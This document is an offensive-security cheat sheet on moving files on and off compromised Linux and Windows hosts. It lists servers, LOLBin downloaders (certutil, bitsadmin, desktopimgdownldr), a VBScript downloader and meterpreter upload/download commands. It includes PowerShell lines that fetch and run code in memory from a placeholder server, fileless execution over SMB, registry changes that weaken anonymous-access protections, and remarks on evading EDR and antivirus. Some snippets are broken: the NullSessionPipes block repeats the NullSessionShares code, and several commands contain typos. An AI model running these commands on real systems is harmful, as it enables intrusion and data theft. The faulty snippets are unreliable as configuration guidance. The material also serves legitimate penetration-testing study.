# General - File transfer

On Linux, it is recommended to verify the integrity of the transferred file
using the built-in `md5sum`.

On Windows, the PowerShell cmdlet `Get-FileHash -Algorithm MD5` can be used to
compute the MD5 file's hash.

### Server side / file sender

The following tools can be used to host files server side.

###### [Linux / Windows] Python

The `SimpleHTTPServer` / `http.server` `Python` modules can be used to quickly
start an HTTP server from the CLI.

The module is however limited : the listening interfaces can not be specified
and no SSL/TLS layer is natively supported.

```python
python2 -m SimpleHTTPServer <PORT>

python3 -m http.server <PORT>
```

On Windows systems with out `Python` installed, the `WinSimpleHTTP` standalone
binary can be used to start a the web server based on `Python`'s
`SimpleHTTPServer` module.

```
# Pre-compiled binaries are available on GitHub
pip install pyinstaller
pyinstaller web.py --onefile

web.exe <PORT>
```

###### [Linux / Windows] Node

The `http-server` Node module can be used to setup an HTTP server from the CLI.

The module supports different configuration options and can be used to listen
on a specific IP address as well as enabling SSL/TLS and CORS.

The `http-server-with-auth` Node module additionally provides a basic HTTP
authentication mechanism.

```
# npm install -g http-server
# npm install -g http-server-with-auth

http-server -a <IP> -p <PORT> --cors
http-server -a <IP> -p <PORT> --cors --ssl --cert <PATH_CERT> --key <PATH_PRIV_KEY>
http-server -a <IP> -p <PORT> --cors --usernmae <USERNAME> --password <PASSWORD>
```

###### [Linux] curl

```bash
# Needs the receiver to be listening
curl -F 'data=@<FILE>' http://<IP>:<PORT>
```

###### [Linux / Windows] netcat

```
# Needs the receiver to be listening

nc -w 3 <IP> <PORT> < <FILE>

# The ncat.exe from https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe or https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip offer a better compatibility across Windows systems
# Use of PowerShell's Get-Content, and its alias (cat, type, gc, etc.), may induce a corrupted file.

cmd.exe /c 'type <FILE> | ./nc.exe -w 3 <IP> <PORT>'
```

###### [Linux] socat

```
# Similarly to nc, needs the receiver to be listening
socat -u FILE:<FILE> TCP:<IP>:<PORT>
```

###### [Linux] impacket-smbserver

```bash
smbserver.py <SHARE_NAME> <SHARE_PATH>
smbserver.py -smb2support <SHARE_NAME> <SHARE_PATH>

smbserver.py -smb2support <SHARE_NAME> `pwd`
```

###### [Windows] SMB shares

On Windows, the graphical interface of `Windows Explorer` can be used to share
a specific folder over the network. Sharing a folder requires Administrators or
`NT AUTHORITY\SYSTEM` privileges.

Note that the final access permissions for a shared resource are determined by
considering both the `NTFS` permissions and the sharing protocol permissions,
and then applying the more restrictive permissions. Thus, it is possible to
grant "Everyone" full access permission when configuring the share permissions.

```
# Share permissions
Right click folder -> Properties -> Sharing -> Share -> Everyone

# NTFS permissions - Needs to be applied to the folder and its files
Right click folder -> Properties -> Security -> Edit -> Add
  -> From this location -> <DOMAIN>
  -> Enter the object names to select -> <USERNAME> or ANONYMOUS LOGON + Everyone (-> Check Names)
```

The above procedure, through `Windows Explorer`, can also be done in
PowerShell:

```
mkdir <SHARE_FOLDER_PATH>

# Grants read-only access to ANONYMOUS LOGON and Everyone.
icacls <SHARE_FOLDER_PATH> /T /grant Anonymous` logon:`(OI`)`(CI`)r
icacls <SHARE_FOLDER_PATH> /T /grant Everyone:`(OI`)`(CI`)r
New-SmbShare -Path <SHARE_FOLDER_PATH> -Name <SHARE_NAME> -ReadAccess 'ANONYMOUS LOGON','Everyone'

# Grants full control (read, write, delete, edit permissions, etc.) to ANONYMOUS LOGON and Everyone.
icacls <SHARE_FOLDER_PATH> /T /grant Anonymous` logon:`(OI`)`(CI`)f
icacls <SHARE_FOLDER_PATH> /T /grant Everyone:`(OI`)`(CI`)f
New-SmbShare -Path <SHARE_FOLDER_PATH> -Name <SHARE_NAME> -FullAccess 'ANONYMOUS LOGON','Everyone'

# Grants the specified rights to the specified security principals.
# r / ReadAccess: read-only access, m / ChangeAccess: modify access (read, write, create, delete), and f / FullAccess: full control.
icacls <SHARE_FOLDER_PATH> /T /grant <USERNAME | <DOMAIN>\<USERNAME>:`(OI`)`(CI`)<r | m | f>
New-SmbShare -Path <SHARE_FOLDER_PATH> -Name <SHARE_NAME> [-ReadAccess | -ChangeAccess | -FullAccess] <USERNAME | <DOMAIN>\<USERNAME> | GROUPNAME | <DOMAIN>\<GROUPNAME> | COMMA_SEPARARED_LIST_OF_PRINCIPALS>

# Removes (with out prompting for confirmation) the specifed share.
Remove-SmbShare -Force -Name <SHARE_NAME>
```

Anonymous (`ANONYMOUS LOGON`) access may be prevented through system wide
settings, independently of the access rights configured at the share and `NTFS`
levels. Indeed, if the `RestrictNullSessAccess` registry key is enabled (set to
`0x1`), anonymous access are restricted to only the named pipes and shares that
are defined, respectively, in the `NullSessionPipes ` and `NullSessionShares`
registry keys. Additional security parameters defined through registry keys
may also interfere with anonymous access:
  - `RestrictAnonymous`: if enabled (set to `0x1`), prevents users who logged
    on anonymously to lists share names.
  - `EveryoneIncludesAnonymous`: if disabled (set to `0x0`), prevents users who
    logged on anonymously to have the same rights as the built-in Everyone
    group.

The following PowerShell commands can be used to authorize anonymous access to
the specified share and disable the security parameters that may interfere with
anonymous logon system-wide (effectively lowering the computer security
configuration however):

```
# Checks if anonymous access are restricted (RestrictNullSessAccess registry key).
reg query HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\ /v RestrictNullSessAccess

# If RestrictNullSessAccess is Enabled, the NullSessionShares and NullSessionPipes registry keys must be updated as follow.
# Appends the specified share to the NullSessionShares registry key to authorized anonymous access to the share.
$key = Get-Item "HKLM:System\CurrentControlSet\Services\LanManServer\Parameters"
$values = $key.GetValue("NullSessionShares")
$values += "<SHARE_NAME>"
Set-ItemProperty "HKLM:\System\CurrentControlSet\Services\LanManServer\Parameters" "NullSessionShares" $values -Type MultiString

# Appends "srvsvc" to the NullSessionPipes registry key to authorized anonymous access to the srvsvc named pipe used by the SMB protocol.
$key = Get-Item "HKLM:System\CurrentControlSet\Services\LanManServer\Parameters"
$values = $key.GetValue("NullSessionShares")
$values += "<SHARE_NAME>"
Set-ItemProperty "HKLM:\System\CurrentControlSet\Services\LanManServer\Parameters" "NullSessionShares" $values -Type MultiString

# Validates the NullSessionPipes and NullSessionShares updates.
reg query HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\


# Checks if RestrictAnonymous is enabled (0x1) and, if necessary, disables it (0x0).
reg query "HKLM\System\CurrentControlSet\Control\Lsa" /v RestrictAnonymous
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v RestrictAnonymous /t REG_DWORD /d 0 /f

# Checks if EveryoneIncludesAnonymous is disabled (0x0) and, if necessary, enables it (0x1).
reg query "HKLM\System\CurrentControlSet\Control\Lsa" /v EveryoneIncludesAnonymous
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v EveryoneIncludesAnonymous /t REG_DWORD /d 1 /f
```

###### [Linux / Windows] FTP

```
# pip install pyftpdlib
python -m pyftpdlib -w -p <PORT>
```

###### [Linux / Windows] TFTP

```
# Metasploit server module
use auxiliary/server/tftp

# Unix daemon
mkdir <TFTPFOLDER>
atftpd --daemon --port <PORT> <TFTPFOLDER>
```

###### [Windows] PowerShell HTTP PUT request

The PowerShell cmdlets `Invoke-WebRequest` and `Invoke-RestMethod` can be used
to send a file, or directly a variable content, through a HTTP PUT request to
a webserver (that should process the request and store the received PUT body):

```
Invoke-WebRequest -Method PUT -Uri "http://<IP>:<PORT>/<FILE>" -Infile <FILE_PATH>
Invoke-RestMethod -Method PUT -Uri "http://<IP>:<PORT>/<FILE>" -Infile <FILE_PATH>

Invoke-WebRequest -Method PUT -Uri "http://<IP>:<PORT>/<FILE>" -Body <$VARIABLE>
Invoke-RestMethod -Method PUT -Uri "http://<IP>:<PORT>/<FILE>" -Body <$VARIABLE>
```

###### [Windows] Simulated keyboard

A keyboard can be simulated, by emulating keystrokes, to send `base64`-encoded
files on specifically hardened systems (that restrict the usage of the tools
and utilities presented in this note and disable the clipboard). The simulated
keystrokes may be used to write a file or in directly outputted into a
PowerShell variable inside an interactive terminal.

The transfer time is however overwhelming long and this method is not adapted
to larger files.

```
Function Invoke-SimulateKeyboard ($FilePath) {
    $EncodedData = [Convert]::ToBase64String([IO.File]::ReadAllBytes($FilePath))

    TimeOut 2

    $EncodedData.ToCharArray() | ForEach-Object {[System.Windows.Forms.SendKeys]::SendWait($_)}
}

$FilePath = "<FILE_TO_TRANSFER>"

Invoke-SimulateKeyboard $FilePath
```

### Client side / file receiver

The following tools can be used to download file from a server client side.  

File transfer is easier on Linux machines as `wget`, `curl` or `netcat` are
often packaged with the operating system distribution.  

On Windows machines, the process is usually not as straight forward but
multiples methods can still be used. Transferring the `netcat` utility may
simplify the subsequent files transfer.  

###### LOLBINS

The most reliable tools and methods are presented below. For a more exhaustive
list of tools that can be used to transfer files on and off a Windows machine,
refer to `https://lolbas-project.github.io/#/download`.

To following commands can be used to retrieve the list of binaries present on
the host.

```
# Windows
Get-ChildItem C:\ -recurse -file | ForEach-Object { if ($_ -match '.+?exe$') { write-host "$($_.Name),$($_.FullName)" }}

# Linux
find / -type f -executable -exec sh -c "file -i '{}' | grep -q 'x-executable; charset=binary'" \; -print
```

###### [Linux / Windows] echo & base64 encoding

The Linux built-ins `echo` and `base64` and the Windows CMD built-ins `echo` and
`certutil` can be used to easily transfer files on Linux / Windows systems.   

Encode the file to be transferred using base64 server-side, copy it to the
clipboard buffer, and decode it into a file client-side.

```
# Server-side (Linux)
base64 -w 0 <FILE> | xclip -selection clipboard

# Server-side (Windows). Newlines can be trimmed on Linux using sed.
certutil -encode <FILE> tmp_file_base64.txt
sed ':a;N;$!ba;s/\n//g' <FILE>

# Client-side - Linux
echo '<BASE64_FILECONTENT>' | base64 --decode > <OUTPUT_FILE>

# Client-side - Windows
echo <BASE64_FILECONTENT> > tmp_file_base64.txt
certutil -decode tmp_file_base64.txt <OUTPUT_FILE>
# del tmp_file_base64.txt
```

###### [Linux] wget

```bash
wget <URL>
wget http://<IP>:<PORT>/<FILE>
wget -O <OUTPUT_FILE> http://<IP>:<PORT>t/<FILE>
wget -r --no-parent -nH --reject "index.html*" http://<IP>:<PORT>/<DIR>
```

###### [Linux] curl

```bash
curl <URL> > <OUTPUT_FILE>
curl http://<IP>:<PORT>/<FILE> > <OUTPUT_FILE>
curl -O http://<IP>:<PORT>/<FILE>
```

###### [Linux / Windows] netcat

```bash
# To be started before the transfer request is made server-side
# The ncat.exe from https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe or https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip offer a better compatibility across Windows systems

nc -lvnp <PORT> > <OUTPUT_FILE>
nc -lvnp <PORT> | tee <OUTPUT_FILE>
```

###### [Linux] socat

```bash
# Similarly to nc, to be started before the transfer request is made server-side
socat -u TCP-LISTEN:<PORT>,reuseaddr OPEN:<FILE>,creat,trunc
```

###### [FreeBSD] fetch

The FreeBSD built-in `fetch` can be used to retrieve a file by URL:

```
fetch <URL>
fetch -o <OUTPUT_FILE> http://<IP>:<PORT>/<FILE>
```

###### [Linux / Windows] Python

```python
python -c "from urllib import urlretrieve; urlretrieve('http://<IP>:<PORT>/<FILE>', '<OUTPUT_FILE>')"
python3 -c "from urllib.request import urlretrieve; urlretrieve('http://<IP>:<PORT>/<FILE>', '<OUTPUT_FILE>')"
```

###### [Linux / Windows] Perl

```perl
perl -le "use File::Fetch; my $ff = File::Fetch->new(uri => 'http://<IP>:<PORT>/<FILE>'); my $file = $ff->fetch() or die $ff->error;"
```

###### [Windows] Powershell

The PowerShell cmdlets `Invoke-WebRequest`, `DownloadFile` and `New-PSDrive`
can be used to download files from a remote web service or SMB share.

```powershell
Invoke-WebRequest -Uri <URL> -OutFile <OUTPUT_FILE>
(New-Object Net.WebClient).DownloadFile('http://<IP>:<PORT>/<FILE>', '<FULLPATH\FILENAME>');

# Load in memory and execute
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/<FILE>'); Invoke-ImportedCMD"
echo IEX (New-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/<FILE>') | powershell -nop -exec bypass -

# Connect to a SMB share
New-PSDrive -Name "LocalMountedFolder" -PSProvider "FileSystem" -Root "\\<IP>\<SHARE>"; cd LocalMountedFolder:
```

###### [Windows] VBScript

`VBScript`, a Microsoft scripting language modeled on Visual Basic, can be used
to transfer files (although larger files > 2MB tend to pose problem).

As the execution of VBScript may be restricted by GPO, the first step is to make
sure VBScript can be used on the compromised machine:

```
echo WScript.StdOut.WriteLine "Successfully ran VBScript!" > test.vbs

cscript test.vbs
```

If `Successfully ran VBScript!` is printed on the console screen, VBScript can
be executed on the target. On the contrary, if any of the following error
messages is displayed, the usage of VBScript is restricted:

```
This program is blocked by group policy. For more information, contact your system administrator.
Access is denied.
```

The following CMD commands can be used to create a VBScript downloader
(courtesy of @frizb):

```
# =< Windows 8 / Windows Server 2012
echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")  > dl.vbs &echo dim bStrm: Set bStrm = createobject("Adodb.Stream")  >> dl.vbs &echo xHttp.Open "GET", WScript.Arguments(0), False  >> dl.vbs &echo xHttp.Send >> dl.vbs & echo bStrm.type = 1 >> dl.vbs &echo bStrm.open >> dl.vbs & echo bStrm.write xHttp.responseBody >> dl.vbs &echo bStrm.savetofile WScript.Arguments(1), 2 >> dl.vbs

# Windows 10 / Windows Server 2016
echo dim xHttp: Set xHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")  > dl.vbs &echo dim bStrm: Set bStrm = createobject("Adodb.Stream")  >> dl.vbs &echo xHttp.Open "GET", WScript.Arguments(0), False  >> dl.vbs &echo xHttp.Send >> dl.vbs &echo bStrm.type = 1 >> dl.vbs &echo bStrm.open >> dl.vbs &echo bStrm.write xHttp.responseBody >> dl.vbs &echo bStrm.savetofile WScript.Arguments(1), 2 >> dl.vbs
```

The VBScript can then be used to download files on the target:

```
cscript dl.vbs "http://<IP>:<PORT>/<FILE>" ".\<FILENAME>"
```

###### [Windows] SMB shares

The Windows built-in utility `xcopy` can be used to download or upload files
on a remote SMB share over the network:

```
# /Y: suppresses prompting to confirm the overwrite of an existing destination file
# /i: suppress prompting to confirm xcopy whether Destination is a file or a directory
# /q: Suppresses the display of xcopy messages

xcopy /Y /i /q "<LOCAL_FILE_PATH>" "\\<LHOST>\<SMB_SHARE>"
```

Additionally, SMB shares can be accessed and mounted using the Windows `net`
command-line utility. Once mounted the drive can be accessed as a local drive.

The most interesting feature of using SMB is the fact that files
can be directly executed over the SMB Share without the needed to write them
to the target machine file system, effectively resulting in file less execution.

```
# Confirm the SMB share is accessible
net view \\<HOSTNAME | IP>\<SHARE_NAME>

# Direct execution through CMD shell
\\<HOSTNAME | IP>\<SHARE_NAME>\<FILE>

# Mount the share to the S: drive
net use S: \\<HOSTNAME | IP>\<SHARE_NAME>
net use S: \\<HOSTNAME | IP>\<SHARE_NAME> /user:<DOMAIN>\<USERNAME> <PASSWORD>

# Direct access without mounting
dir \\<HOSTNAME | IP>\<SHARE_NAME>
copy \\<HOSTNAME | IP>\<SHARE_NAME>\<FILE> .
```


###### [Windows] BITS

`Background Intelligent Transfer Service (BITS)` is a Microsoft Windows
component developed to asynchronously transfer files with a reduced network
bandwidth usage. It is notably used by `Windows Server Update Services (WSUS)`
and `System Center Configuration Manager (SCCM)` servers to deliver updates to
Windows clients. Others third-party software, such as Firefox and Google
Chrome, also rely on `BITS` to download their updates on Windows operating
systems. `BITS` supports transfers over the `SMB`, `HTTP` and `HTTPS`
protocols.

`BITSAdmin` is a Windows command-line built-in utility that can be used to
create, download or upload files using `BITS`. Note that `BITSAdmin` will not
attempt the download if the security context under which its executed does not
have the permission to write files on the specified output path.

Due to its possible legitimate usage, download of files through `bitsadmin` may
not be identified as malicious by `Endpoint Detection and Response` products.

```
# Download the remote file.
bitsadmin /transfer <job | JOB_NAME> http://<IP | HOSTNAME>:<PORT>/<FILE> <OUTPUT_FILE_PATH>

# Upload the local file to the remote location.
bitsadmin /transfer <job | JOB_NAME> /upload http://<IP | HOSTNAME>:<PORT>/<FILE> <INPUT_FILE_PATH>
```

Note that downloaded files can be directly and executed using `bitsadmin`:

```
bitsadmin /create <JOB_NAME>
bitsadmin /addfile <JOB_NAME> http://<IP | HOSTNAME>:<PORT>/<FILE> <OUTPUT_FILE_PATH>
bitsadmin /SetNotifyCmdLine <JOB_NAME> <OUTPUT_FILE_PATH> NUL
bitsadmin /SetMinRetryDelay <JOB_NAME> 60
bitsadmin /resume <JOB_NAME>
```

The PowerShell `Start-BitsTransfer` may be used as well to download / upload
files through `BITS`:

```
# Download the remote file(s) using HTTP/S or SMB.
Start-BitsTransfer -Source "http://<IP | HOSTNAME>:<PORT>/<FILE>" -Destination "<OUTPUT_FILE_PATH>"
Start-BitsTransfer -Source "\\<IP | HOSTNAME>\<SHARE>\<FILE | *>" -Destination "<OUTPUT_FILE_PATH>"

# Upload the local file(s) to the remote location using HTTP/S or SMB.
Start-BitsTransfer -TransferType Upload -Source "<INPUT_FILE_PATH>" -Destination "http://<IP | HOSTNAME>:<PORT>/<FILE>"
Start-BitsTransfer -TransferType Upload -Source "<INPUT_FILE_PATH | *>" -Destination "\\<IP | HOSTNAME>\<SHARE>\"
```

Note that while the `Start-BitsTransfer` cmdlet supports the specification of
alternative `PSCredential` credentials with the `-Credential` parameter, the
functionality is currently bugged. Instead, a temporary drive mapping should be
created using the `New-PSDrive` cmdlet (`PowerShell 3.0`) or
`WScript.Network` object.

```
New-PSDrive -Credential <PSCredential> -Name "<DRIVE_NAME>" -PSProvider "FileSystem" -Root "\\<IP | HOSTNAME>\<SHARE>\"

$net = new-object -ComObject WScript.Network
$net.MapNetworkDrive("<DRIVE_LETTER>", "\\<IP | HOSTNAME>\<SHARE>\", $false, "<DOMAIN | WORKGROUP>\<USERNAME>", "<PASSWORD>")

Start-BitsTransfer -Source "<DRIVE_NAME | DRIVE_LETTER>:\<FILE | *>" -Destination "<OUTPUT_FILE_PATH>"
```

###### [Windows] CertUtil

`CertUtil` is a Windows command-line tool designed to manage `Certification
Authority (CA)` and certificates. One of its feature is the ability to download
files from a remote webserver by specifying an `URL`.

Note that the usage of `CertUtil` is monitored by most `Endpoint Detection and
Response` products and downloads through `CertUtil` may generate detection
alerts.  

```
certutil -urlcache -split -f http://<IP>:<PORT>/<FILE> <FILENAME>
```

###### [Windows] desktopimgdownldr.exe

`desktopimgdownldr` is a Windows built-in utility, initially designed to set
desktop or background screen, that can be used to download arbitrary files from
a web server.

The `SYSTEMROOT` environment variable is used by `desktopimgdownldr` to
determine the output folder and can thus be used to specify an arbitrary output
folder.

```
# Files will be downloaded as "LockScreenImage_<RANDOM>.ext" to "<OUTPUT_FOLDER>\Personalization\LockScreenImage\LockScreenImage\"
set "SYSTEMROOT=<C:\Windows\Temp | OUTPUT_FOLDER>" && cmd /c desktopimgdownldr.exe /lockscreenurl:http://<IP>:<PORT>/<FILE> /eventName:desktopimgdownldr
```

###### [Windows] findstr

`findstr` is a Windows utility used for searching patterns of text in files.

The following command can be used to search the string DoNotExist123456789 in
the specified remote file and, since it does not exist (/V), download it.

```
findstr /V /L DoNotExist123456789 \\<HOSTNAME | IP>\<SHARE_NAME>\<FILE> > <OUTPUT_FILE_PATH>
```

###### [Linux / Windows] FTP

To download file interactively:

```
ftp -A <SERVERIP>
```

Paste the following commands into a remote Windows shell and download files
over FTP non-interactively (replace <USERNAME> by anonymous if using anonymous
login):

```
# Windows
echo open <IP> <PORT> > ftp.txt
echo USER <USERNAME> >> ftp.txt
echo PASS <PASSWORD> >> ftp.txt
echo bin >> ftp.txt
echo GET <FILENAME> >> ftp.txt
echo bye >> ftp.txt
ftp -v -n -s:ftp.txt
```

In case of AV errors while trying to download a binary, omit the exe extension.  

###### [Windows XP & 2003] TFTP

TFTP is a simple protocol for transferring files, implemented on top of the
UDP/IP protocols. TFTP was designed to be small and easy to implement, and
therefore it lacks most of the advanced features offered by more robust file
transfer protocols.
TFTP only reads and writes files from or to a remote server. It cannot list,
delete, or rename files or directories and it has no provisions for user
authentication.  

Windows operating systems up to Windows XP and 2003 contain a TFTP
client, by default. In Windows 7, 2008, and above, this tool needs to be
explicitly added, during installation.

```
tftp -i <SERVERIP> GET <FILENAME>
```

###### [Linux] SCP

The Linux `Secure Copy` utility can be used to transfer files over `SSH` and
can notably be used to retrieve and upload files from a compromised target
exposing a SSH service.  

```
# Download remote <FILENAME> from <HOSTNAME | IP>
scp <USERNAME>@<HOSTNAME | IP>:<DIRECTORY>/<FILENAME>
scp -i <KEY> <USERNAME>@<HOSTNAME | IP>:<DIRECTORY>/<FILENAME>
# Download all files in the remote <DIRECTORY> of <HOSTNAME | IP> to the local <LOCAL_DIRECTORY>
scp -r <USERNAME>@<HOSTNAME | IP>:<DIRECTORY> <LOCAL_DIRECTORY>


# Upload <LOCAL_FILENAME> to <HOSTNAME | IP>
scp <LOCAL_FILENAME> <USERNAME>@<HOSTNAME | IP>:<DIRECTORY>/<FILENAME>
scp -i <KEY> <LOCAL_FILENAME> <USERNAME>@<HOSTNAME | IP>:<DIRECTORY>/<FILENAME>
# Upload all files in the <LOCAL_DIRECTORY> to <HOSTNAME | IP>
scp -r <LOCAL_DIRECTORY> <USERNAME>@<HOSTNAME | IP>:<DIRECTORY>
```

###### [Windows] WinSCP

`WinSCP` is a file transfer graphical utility for Microsoft Windows, available
as an installed program and a standalone binary. `WinSCP` support the following
protocols / services:
  - `FTP`
  - `SFTP`
  - `SCP`
  - `WebDAV`
  - Amazon `S3` buckets

`WinSCP` supports key-based authentication using `PuTTY Private Key File
(.pkf)` as well as `SSL` based private keys.

###### [Linux / Windows] Metasploit meterpreter

The `Metasploit` `meterpreter` commands `download` and `upload` can be used to
download / upload a specific file or to recursively download / upload
directories and their contents.

```
meterpreter> download <FILENAME>
meterpreter> download -r <DIRECTORY>

meterpreter> upload <FILENAME>
meterpreter> upload -r <DIRECTORY>
```

###### [Linux / Windows] Python webserver processing PUT requests

The following Python code extends the Python `SimpleHTTPServer` module to
process HTTP PUT request and store, in the directory the script was started,
the PUT request body content as a file. The filename is specified in the URL
requested.   

Original author: Floating Octothorpe,
`https://f-o.org.uk/2017/receiving-files-over-http-with-python.html`.

```
#!/usr/bin/env python

"""Extend Python's built in HTTP server to save files

curl or wget can be used to send files with options similar to the following

  curl -X PUT --upload-file somefile.txt http://localhost:8000
  wget -O- --method=PUT --body-file=somefile.txt http://localhost:8000/somefile.txt

__Note__: curl automatically appends the filename onto the end of the URL so
the path can be omitted.

"""
import os
try:
    import http.server as server
except ImportError:
    # Handle Python 2.x
    import SimpleHTTPServer as server

class HTTPRequestHandler(server.SimpleHTTPRequestHandler):
    """Extend SimpleHTTPRequestHandler to handle PUT requests"""
    def do_PUT(self):
        """Save a file following a HTTP PUT request"""
        filename = os.path.basename(self.path)

        # Don't overwrite files
        if os.path.exists(filename):
            self.send_response(409, 'Conflict')
            self.end_headers()
            reply_body = '"%s" already exists\n' % filename
            self.wfile.write(reply_body.encode('utf-8'))
            return

        file_length = int(self.headers['Content-Length'])
        with open(filename, 'wb') as output_file:
            output_file.write(self.rfile.read(file_length))
        self.send_response(201, 'Created')
        self.end_headers()
        reply_body = 'Saved "%s"\n' % filename
        self.wfile.write(reply_body.encode('utf-8'))

if __name__ == '__main__':
    server.test(HandlerClass=HTTPRequestHandler)
```

```
# Works with Python2 and Python3
python http_put_server.py
```
